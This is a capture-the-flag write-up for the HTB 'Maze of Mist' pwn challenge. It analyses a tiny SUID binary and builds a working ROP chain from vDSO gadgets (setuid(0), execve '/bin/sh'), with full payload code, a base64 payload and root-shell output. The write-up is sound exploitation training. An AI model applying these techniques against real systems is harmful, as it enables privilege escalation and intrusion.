---
title: "Maze of Mist - Cyber Apocalypse 2024: Hacker Royale"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "xor", "buffer-overflow", "rop", "srop", "heap", "shellcode", "canary", "aslr", "pie", "lsb", "base64", "objdump", "stack", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "Linux Exploitation Expert - HackTricks Training"
source:
  name: "CTFtime writeup #39000"
  url: "https://ctftime.org/writeup/39000"
original_source: "https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Maze of Mist"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Maze of Mist
- **Author team:** Watch4Hack
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/39000>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/>

---
![Linux Exploitation Expert](https://7rocky.github.io/images/LEE.png)

Linux Exploitation Expert — HackTricks Training

Progress from binary exploitation fundamentals to advanced exploit development in Linux across user space, heap, ARM, kernel, and browser targets.

[View Course](https://hacktricks-training.com/courses/lee/) ×

We are given a compressed `vmlinuz-linux` kernel image, an `initramfs.cpio.gz` filesystem and a `run.sh` script:

`

```
    $ unzip -l pwn_maze_of_mist.zip
    Archive:  pwn_maze_of_mist.zip
      Length      Date    Time    Name
    ---------  ---------- -----   ----
            0  2024-02-06 09:30   maze_of_mist/
      1347202  2024-02-06 09:29   maze_of_mist/initramfs.cpio.gz
          291  2024-02-06 09:26   maze_of_mist/run.sh
     12886816  2024-02-06 09:26   maze_of_mist/vmlinuz-linux
    ---------                     -------
     14234309                     4 files
    
    $ unzip pwn_maze_of_mist.zip
    Archive:  pwn_maze_of_mist.zip
       creating: maze_of_mist/
      inflating: maze_of_mist/initramfs.cpio.gz
      inflating: maze_of_mist/run.sh
      inflating: maze_of_mist/vmlinuz-linux
```

`

If we decompress the filesystem, we find a 32-bit binary called `target`:

`

```
    $ cd maze_of_mist
    
    $ gunzip -k initramfs.cpio.gz
    
    $ mkdir initramfs
    
    $ cd initramfs
    
    $ cpio -idm < ../initramfs.cpio
    4959 blocks
    
    $ ls
    bin  dev  etc  home  init  initramfs.cpio.gz  linuxrc  mnt  proc  root  sbin  sys  target  usr  var
    
    $ file target
    target: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

`

## Reverse engineering

The binary is incredibly small:

`

```
    $ objdump -M intel -d target
    
    target:     file format elf32-i386
    
    
    Disassembly of section .text:
    
    08049000 <_vuln>:
     8049000:       b8 03 00 00 00          mov    eax,0x3
     8049005:       31 db                   xor    ebx,ebx
     8049007:       8d 4c 24 e0             lea    ecx,[esp-0x20]
     804900b:       ba 00 02 00 00          mov    edx,0x200
     8049010:       cd 80                   int    0x80
     8049012:       31 c0                   xor    eax,eax
     8049014:       c3                      ret
    
    08049015 <_start>:
     8049015:       b8 04 00 00 00          mov    eax,0x4
     804901a:       bb 01 00 00 00          mov    ebx,0x1
     804901f:       b9 00 a0 04 08          mov    ecx,0x804a000
     8049024:       ba 4a 00 00 00          mov    edx,0x4a
     8049029:       cd 80                   int    0x80
     804902b:       e8 d0 ff ff ff          call   8049000 <_vuln>
     8049030:       b8 01 00 00 00          mov    eax,0x1
     8049035:       31 db                   xor    ebx,ebx
     8049037:       cd 80                   int    0x80
```

`

It is using only three [`syscall` instructions](https://x86.syscall.sh): `sys_exit` (`$eax = 0x1`), `sys_write` (`$eax = 0x3`) and `sys_write` (`$eax = 0x4`):

`

```
    08049000 <_vuln>:
     8049000:       mov    eax, 0x3
     8049005:       xor    ebx, ebx
     8049007:       lea    ecx, [esp - 0x20]
     804900b:       mov    edx, 0x200
     8049010:       int    0x80              # read(0, $ecx, 0x200)
     8049012:       xor    eax, eax
     8049014:       ret
    
    08049015 <_start>:
     8049015:       mov    eax, 0x4
     804901a:       mov    ebx, 0x1
     804901f:       mov    ecx, 0x804a000
     8049024:       mov    edx, 0x4a
     8049029:       int    0x80              # write(1, 0x804a000, 0x80)
     804902b:       call   <_vuln>
     8049030:       mov    eax, 0x1
     8049035:       xor    ebx, ebx
     8049037:       int    0x80              # exit(0)
```

`

There is a clear Buffer Overflow vulnerability in `_vuln`, because the program reserves only `0x20` bytes on the stack (`$esp`), but the program uses `read` with a maximum size of `0x200`. As a result, we can modify the return address and redirect the program execution to other points of the program.

The problem here is that we have NX enabled, so we can’t simply use shellcode:

`

```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`

Therefore, we must use Return-Oriented Programming (ROP) to execute arbitrary code. The problem is that the binary is very small, and we don’t have enough ROP gadgets to exploit the program:

`

```
    $ ROPgadget --binary target
    Gadgets information
    ============================================================
    0x08049022 : add al, 8 ; mov edx, 0x4a ; int 0x80
    0x0804900d : add al, byte ptr [eax] ; add ch, cl ; xor byte ptr [ecx], 0xc0 ; ret
    0x0804900e : add byte ptr [eax], al ; int 0x80
    0x08049033 : add byte ptr [eax], al ; xor ebx, ebx ; int 0x80
    0x0804900c : add byte ptr [edx], al ; add byte ptr [eax], al ; int 0x80
    0x0804900f : add ch, cl ; xor byte ptr [ecx], 0xc0 ; ret
    0x08049031 : add dword ptr [eax], eax ; add byte ptr [eax], al ; xor ebx, ebx ; int 0x80
    0x08049009 : and al, 0xe0 ; mov edx, 0x200 ; int 0x80
    0x08049008 : dec esp ; and al, 0xe0 ; mov edx, 0x200 ; int 0x80
    0x08049010 : int 0x80
    0x08049007 : lea ecx, [esp - 0x20] ; mov edx, 0x200 ; int 0x80
    0x0804900a : loopne 0x8048fc6 ; add byte ptr [edx], al ; add byte ptr [eax], al ; int 0x80
    0x08049030 : mov eax, 1 ; xor ebx, ebx ; int 0x80
    0x0804900b : mov edx, 0x200 ; int 0x80
    0x08049024 : mov edx, 0x4a ; int 0x80
    0x08049023 : or byte ptr [edx + 0x4a], bh ; int 0x80
    0x08049014 : ret
    0x08049011 : xor byte ptr [ecx], 0xc0 ; ret
    0x08049012 : xor eax, eax ; ret
    0x08049035 : xor ebx, ebx ; int 0x80
    
    Unique gadgets found: 20
```

`

## Setup environment

However, there is a reason why they gave us a full kernel image and a `qemu` script (`run.sh`). Actually, we can take a look at the `init` script:

`

```
    #!/bin/sh
    
    export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
    
    chown -R root:root /
    chmod 0700 /root
    
    mount -t proc none /proc
    mount -t sysfs none /sys
    mount -t devpts -o gid=5,mode=0620 devpts /dev/pts
    mount -t devtmpfs -o nosuid,mode=0755 udev /dev
    
    chmod 0400 /root/flag.txt
    chmod u+s /target
    
    hostname arena
    echo 0 >/proc/sys/kernel/randomize_va_space
    
    setsid cttyhack setuidgid 1000 /bin/sh
    
    umount /proc && umount /sys
    poweroff -d 0 -f
```

`

Here we see some interesting things:

  * We need to become `root` to read the flag
  * The `target` binary is SUID, so if we achieve arbitrary code execution, we can become `root`
  * ASLR is disabled because `/proc/sys/kernel/randomize_va_space` has a `0`


First of all, we will modify this line to get `root` permissions once the `qemu` script starts (just for testing):

`

```
    setsid cttyhack setuidgid 0 /bin/sh  # 1000 /bin/sh
```

`

Now, we will use the following `go.sh` script to compress the filesystem and start the kernel:

`

```
    #!/usr/bin/env bash
    
    cd initramfs
    find . -print0 | cpio --null -ov --format=newc | gzip -9 > initramfs.cpio.gz
    mv initramfs.cpio.gz ..
    cd ..
    
    sh run.sh
```

`

We can also add `-s` to the `qemu` script in order to debug later with GDB:

`

```
    #!/bin/sh
    
    qemu-system-x86_64 -s \
        -m 128M \
        -nographic \
        -kernel "./vmlinuz-linux" \
        -append "console=ttyS0 quiet loglevel=3 oops=panic panic=-1 pti=on kaslr" \
        -monitor /dev/null \
        -initrd "./initramfs.cpio.gz" \
        -cpu qemu64,+smep,+smap,+rdrand \
        -smp cores=2
```

`

At this point, we can launch `qemu` and run the binary inside the kernel:

`

```
    root@arena:/# /target
    Where to go, challenger? your fractured reflection is your only guide.
    > asdf
    root@arena:/# /target
    Where to go, challenger? your fractured reflection is your only guide.
    > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation fault
```

`

## Exploit strategy

We are not able to reuse the instructions in the binary to gain arbitrary code execution using ROP. But there’s more regions of memory loaded in the program:

`

```
    root@arena:/# /target &
    root@arena:/# Where to go, challenger? your fractured reflection is your only guide.
    >
    [1]+  Stopped (tty input)        /target
    root@arena:/# pidof target
    76
    root@arena:/# cat /proc/76/maps
    08048000-08049000 r--p 00000000 00:02 317                                /target
    08049000-0804a000 r-xp 00001000 00:02 317                                /target
    0804a000-0804b000 rw-p 00002000 00:02 317                                /target
    f7ff8000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
    f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
    fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```

`

The binary’s instructions is at `08049000-0804a000`, but we have another executable page at `f7ffc000-f7ffe000`, which is vDSO. This region is used to let the program use `syscall` instructions, to redirect the execution to the kernel.

We can dump its content using `dd`:

`

```
    root@arena:/# dd if=/proc/76/mem of=vdso bs=1 skip=$((0xf7ffc000)) count=$((0x2000))
    8192+0 records in
    8192+0 records out
    8192 bytes (8.0KB) copied, 0.901154 seconds, 8.9KB/s
```

`

Now, to extract it, we can use `gzip` and `base64`:

`

```
    root@arena:/# gzip vdso
    root@arena:/# base64 vdso.gz
    H4sIAAAAAAAAA+2ZcXQbxZnAd7WyrQThVc4usbFjm54Bc3HdKDEQ1cGPEAuXa5RAYiWBoLgmUUge
    ...
    ZJqelnRb4NxPQe/5Gdr78vjy+PL48vh7Pv4CVkquWAAgAAA=
```

`

`

```
    $ echo '<base64-payload>' | base64 -d | gzip -d - > vdso
    
    $ file vdso
    vdso: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=3217528fe99bd85fcb961d07aa790af666c989c7, stripped
```

`

In this binary file, we can find more ROP gadgets.

The best approach is to use `sys_sigreturn`, because it allows to set all registers using a stack frame. As a result, we would be able to set all registers and leave them ready to execute `sys_execve` and gain arbitrary code execution. Notice that we already have ROP gadgets that execute a `sys_sigreturn` (`$eax = 0x77`), because it is used to switch to kernel mode:

`

```
    $ ROPgadget --binary vdso | grep 'int 0x80'
    0x0000058e : add byte ptr [eax + 0x77b858], dl ; add byte ptr [eax], al ; int 0x80
    0x0000059f : add byte ptr [eax + 0xad], bh ; int 0x80
    0x0000059d : add byte ptr [eax], al ; add byte ptr [eax + 0xad], bh ; int 0x80
    0x0000059c : add byte ptr [eax], al ; add byte ptr [eax], al ; mov eax, 0xad ; int 0x80
    0x00000594 : add byte ptr [eax], al ; int 0x80
    0x0000059e : add byte ptr [eax], al ; mov eax, 0xad ; int 0x80
    0x0000058d : add byte ptr [eax], al ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
    0x00000577 : int 0x80
    0x00000592 : ja 0x594 ; add byte ptr [eax], al ; int 0x80
    0x00000591 : mov eax, 0x77 ; int 0x80
    0x000005a0 : mov eax, 0xad ; int 0x80
    0x0000058f : nop ; pop eax ; mov eax, 0x77 ; int 0x80
    0x00000590 : pop eax ; mov eax, 0x77 ; int 0x80
```

`

During the development phase, I couldn’t find a payload that worked with `sys_sigreturn` on the remote instance, so I used a different approach.

My objective was to execute `setuid(0)` and `execve("/bin/sh", ["/bin/sh", NULL], NULL)`. The first `syscall` is needed because we need to become `root` (the binary is SUID, but that’s not enough to execute as `root`). On the other hand, we need to call `/bin/sh` and set the first argument (`argv[0]`) to `/bin/sh` too because the kernel uses `busybox`, so running just `/bin/sh` will just output the help panel of `busybox`, and not spawn a shell:

`

```
    root@arena:/# ls -l /bin/sh
    lrwxrwxrwx    1 root     root             7 Mar 17 12:31 /bin/sh -> busybox
```

`

So, I need the following:

  * Set `$eax = 0x17` for `sys_setuid16` and `$ebx = 0`
  * Write `"/bin/sh\0"` at a writable address
  * Write the address of `"/bin/sh\0"` and a `NULL` pointer at a writable address
  * Set `$eax = 0xb` for `sys_execve`, set `$ebx` to the address of `"/bin/sh\0"`, set `$ecx` to the address that points to the address of `"/bin/sh\0"` and set `$edx = 0`


## Exploit development

For this, I found the following ROP gadgets and writable addresses:

`

```
    vdso_addr = 0xf7ffc000
    
    int_0x80_xor_eax_eax_ret_addr = 0x8049010
    bin_sh_addr = 0x804a800
    
    # 0x0000057a : pop edx ; pop ecx ; ret
    pop_edx_pop_ecx_ret_addr = vdso_addr + 0x57a
    
    # 0x00000cca : mov dword ptr [edx], ecx ; add esp, 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    mov_dword_ptr_edx_ecx_ret_addr = vdso_addr + 0xcca
    
    # 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] ; pop edi ; pop ebp ; ret
    or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr = vdso_addr + 0xccb
    
    # 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret
    pop_ebx_pop_esi_pop_ebp_ret = vdso_addr + 0x15cd
```

`

With those, I have a way to easily set `$edx`, `$ecx`, `$ebx`, `$edi`, `$esi` and `$ebp`.

Moreover, we have a write-what-where ROP gadget, which is useful to write `"/bin/sh\0"` at a writable address. For this, we need to put the value we want to write in `$ecx` and the address where we want to write it to in `$edx`. The drawback of this ROP gadget is that the stack pointer is increased in `0x34`, so we have lost 13 ROP gadgets.

Last but not least, we can set almost arbitrary values at `$eax` by finding an address that contains the value we want for `$eax` (or something that will be the result of an OR operation).

This will be the execution of `setuid(0)`:

`

```
    payload  = b'A' * 32
    
    payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
    payload += p32((0x804a08c - 0x5e5b34c4) & 0xffffffff)
    payload += p32(0) * 2
    payload += p32(or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr)
    payload += p32(0) * 2
    
    payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
    payload += p32(0) * 3
    
    # sys_setuid(0)
    payload += p32(int_0x80_xor_eax_eax_ret_addr)
```

`

Notice that the Buffer Overflow offset is 32 (`0x20`), as seen before on the assembly code. Then, we are using the byte at address `0x804a08c` to set the value of `$eax = 0xd` (the previous value was `$eax = 0`):

`

```
    $ xxd initramfs/target | grep -E ' 17|17 '
    00002080: 00a0 0408 0000 0000 0000 0200 1700 0000  ................
```

`

Notice that the binary will be loaded at `0x8048000`, so the above offset is `0x804a08c`. Also, we don’t have ASLR, so the vDSO memory region is always at `0xf7ffc000`.

The following part will set `$eax = 0xb`:

`

```
    payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
    payload += p32((0x8048012 - 0x5e5b34c4) & 0xffffffff)
    payload += p32(0) * 2
    payload += p32(or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr)
    payload += p32(0) * 2
    payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
    payload += p32((0x804803f - 0x5e5b34c4) & 0xffffffff)
    payload += p32(0) * 2
    payload += p32(or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr)
    payload += p32(0) * 2
```

`

We don’t have `0x0b` in the binary, but we can find `0x3` and `0x8`, so that `0x3 | 0x8 = 0xb` (offsets `0x8048012` and `0x804803f`):

`

```
    $ xxd initramfs/target | head -4
    00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
    00000010: 0200 0300 0100 0000 1590 0408 3400 0000  ............4...
    00000020: 4021 0000 0000 0000 3400 2000 0400 2800  @!......4. ...(.
    00000030: 0600 0500 0100 0000 0000 0000 0080 0408  ................
```

`

The next part of the ROP chain is used to write `"/bin/sh\0"` into a writable address (for instance, `0x804a800`):

`

```
    payload += p32(pop_edx_pop_ecx_ret_addr)
    payload += p32(bin_sh_addr)
    payload += b'/bin'
    payload += p32(mov_dword_ptr_edx_ecx_ret_addr)
    payload += p32(0) * (4 + 13)
    
    payload += p32(pop_edx_pop_ecx_ret_addr)
    payload += p32(bin_sh_addr + 4)
    payload += b'/sh\0'
    payload += p32(mov_dword_ptr_edx_ecx_ret_addr)
    payload += p32(0) * (4 + 13)
```

`

We also need to write the address that points to the address of `"/bin/sh\0"` in a writable address as the `argv` for `execve`:

`

```
    payload += p32(pop_edx_pop_ecx_ret_addr)
    payload += p32(bin_sh_addr + 0x30)
    payload += p32(bin_sh_addr)
    payload += p32(mov_dword_ptr_edx_ecx_ret_addr)
    payload += p32(0) * (4 + 13)
```

`

Finally, we call `sys_execve`:

`

```
    payload += p32(pop_ebx_pop_esi_pop_ebp_ret)
    payload += p32(bin_sh_addr)
    payload += p32(0) * 2
    payload += p32(pop_edx_pop_ecx_ret_addr)
    payload += p32(0)
    payload += p32(bin_sh_addr + 0x30)
    
    # sys_execve("/bin/sh", ["/bin/sh", NULL], NULL)
    payload += p32(int_0x80_xor_eax_eax_ret_addr)
```

`

Since the above payload is going to be “one-shot”, we just Base64-encode it and print it out:

`

```
    assert len(payload) <= 0x200
    print(b64e(payload))
```

`

This is the payload:

`

```
    $ python3 solve.py
    QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/93tLqakAAAAAAAAAAMvM//cAAAAAAAAAAHrF//cAqAQIL2JpbsrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cEqAQIL3NoAMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cwqAQIAKgECMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM3V//cAqAQIAAAAAAAAAAB6xf/3AAAAADCoBAgQkAQI
```

`

We will use the following set of commands to input the payload and leave the process open with `cat` to execute commands when the shell spawns:

`

```
    (echo '<base64-payload>' | base64 -d; cat) | /target
```

`

And with this, we have a shell locally:

`

```
    root@arena:/# (echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/93tLqakAAAAAAAAAAMvM//cAAAAAAAAAAHrF//cAqAQIL2JpbsrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cEqAQIL3NoAMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cwqAQIAKgECMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM3V//cAqAQIAAAAAAAAAAB6xf/3AAAAADCoBAgQkAQI | base64 -d; cat) | /target
    Where to go, challenger? your fractured reflection is your only guide.
    > ls
    
    bin      etc      init     mnt      root     sys      usr
    dev      home     linuxrc  proc     sbin     target   var
    whoami
    
    root
    cat /root/flag.txt
    
    HTB{fake_flag}
```

`

It is worth mentioning that during the exploit development, I needed to debug the exploit, but it was pretty hard because it was running inside `qemu`. I found a workaround by [enabling core dumps](https://stackoverflow.com/questions/17965/how-to-generate-a-core-dump-in-linux-on-a-segmentation-fault), and then copying the core file into my machine and debugging with GDB to see where the exploit failed. Another approach was to debug the kernel and set breakpoints at `syscall` instructions, then we can achieve the flow execution of the 32-bit program.

## Flag

Let’s go remote:

`

```
    $ nc 94.237.62.195 36866
    SeaBIOS (version rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org)
    
    
    iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+06FD1040+06F31040 CA00
    
    
    
    Booting from ROM...
    challenger@arena:/$ whoami
    whoami
    challenger
    challenger@arena:/$ ls
    ls
    bin      etc      init     mnt      root     sys      usr
    dev      home     linuxrc  proc     sbin     target   var
    challenger@arena:/$ cat /root/flag.txt
    cat /root/flag.txt
    cat: can't open '/root/flag.txt': Permission denied
    challenger@arena:/$ (echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8zt
    (echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQ
    AAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8z/9w
    AAAAAAAAAAzdX/93tLqakAAAAAAAAAAMvM//cAAAAAAAAAAHrF//cAqAQIL2JpbsrM//cAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH
    rF//cEqAQIL3NoAMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cwqAQIAKgECMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM3V//cAqAQIAAAAAA
    AAAAB6xf/3AAAAADCoBAgQkAQI | base64 -d; cat) | /target
    Where to go, challenger? your fractured reflection is your only guide.
    > whoami
    whoami
    
    
    root
    cat /root/flag.txt
    cat /root/flag.txt
    
    
    HTB{Sm4sh1nG_Th3_V01d_F0r_Fun_4nd_Pr0f1t}
```

`

The full exploit code is here: [`solve.py`](https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20Cyber%20Apocalypse/Pwn/Maze%20of%20Mist/solve.py).
